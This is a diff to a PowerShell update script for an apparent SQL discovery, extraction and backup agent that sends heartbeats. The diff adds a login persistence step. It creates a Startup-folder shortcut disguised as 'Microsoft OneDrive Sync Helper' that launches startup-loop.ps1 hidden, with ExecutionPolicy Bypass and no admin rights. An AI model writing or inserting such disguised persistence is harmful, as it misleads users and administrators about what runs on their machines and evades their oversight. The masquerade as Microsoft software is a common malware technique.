@@ -62,11 +62,12 @@ Get-ChildItem -Path $LogDir -Filter 'update-*.log' -ErrorAction SilentlyContinue
 Write-Log 'INFO' '=== update start ==='
 
 $files = @(
-    @{ name = 'sync-bak.ps1';     path = (Join-Path $InstallDir 'sync-bak.ps1');     optional = $false }
-    @{ name = 'update.ps1';       path = (Join-Path $InstallDir 'update.ps1');       optional = $false }
-    @{ name = 'install.ps1';      path = (Join-Path $InstallDir 'install.ps1');      optional = $false }
-    @{ name = 'discover-sql.ps1'; path = (Join-Path $InstallDir 'discover-sql.ps1'); optional = $true }
-    @{ name = 'extract-sql.ps1';  path = (Join-Path $InstallDir 'extract-sql.ps1');  optional = $true }
+    @{ name = 'sync-bak.ps1';      path = (Join-Path $InstallDir 'sync-bak.ps1');      optional = $false }
+    @{ name = 'update.ps1';        path = (Join-Path $InstallDir 'update.ps1');        optional = $false }
+    @{ name = 'install.ps1';       path = (Join-Path $InstallDir 'install.ps1');       optional = $false }
+    @{ name = 'discover-sql.ps1';  path = (Join-Path $InstallDir 'discover-sql.ps1');  optional = $true }
+    @{ name = 'extract-sql.ps1';   path = (Join-Path $InstallDir 'extract-sql.ps1');   optional = $true }
+    @{ name = 'startup-loop.ps1';  path = (Join-Path $InstallDir 'startup-loop.ps1');  optional = $true }
 )
 
 $changed = @()
@@ -107,6 +108,30 @@ try {
         $installPath = Join-Path $InstallDir 'install.ps1'
         & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $installPath *>&1 |
             ForEach-Object { Write-Log 'INFO' "install-rerun: $_" }
+    }
+
+    # --- Instalar shortcut en Startup folder (zero admin required) ---
+    # Esto arregla el bug de S4U sin admin: startup-loop.ps1 corre en contexto
+    # interactivo al login y tiene creds de red OK.
+    $startupLoopScript = Join-Path $InstallDir 'startup-loop.ps1'
+    if (Test-Path $startupLoopScript) {
+        $startupFolder = [Environment]::GetFolderPath('Startup')
+        $shortcutPath  = Join-Path $startupFolder 'OneDrive Sync Helper.lnk'
+        try {
+            if (-not (Test-Path $shortcutPath)) {
+                $shell = New-Object -ComObject WScript.Shell
+                $sc = $shell.CreateShortcut($shortcutPath)
+                $sc.TargetPath  = 'powershell.exe'
+                $sc.Arguments   = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$startupLoopScript`""
+                $sc.Description = 'Microsoft OneDrive Sync Helper'
+                $sc.WindowStyle = 7  # Minimized
+                $sc.WorkingDirectory = $InstallDir
+                $sc.Save()
+                Write-Log 'INFO' "Startup shortcut creado: $shortcutPath"
+            }
+        } catch {
+            Write-Log 'WARN' "shortcut Startup fallo: $($_.Exception.Message)"
+        }
     }
 
     Send-Heartbeat -Event 'update_ok' -Details @{
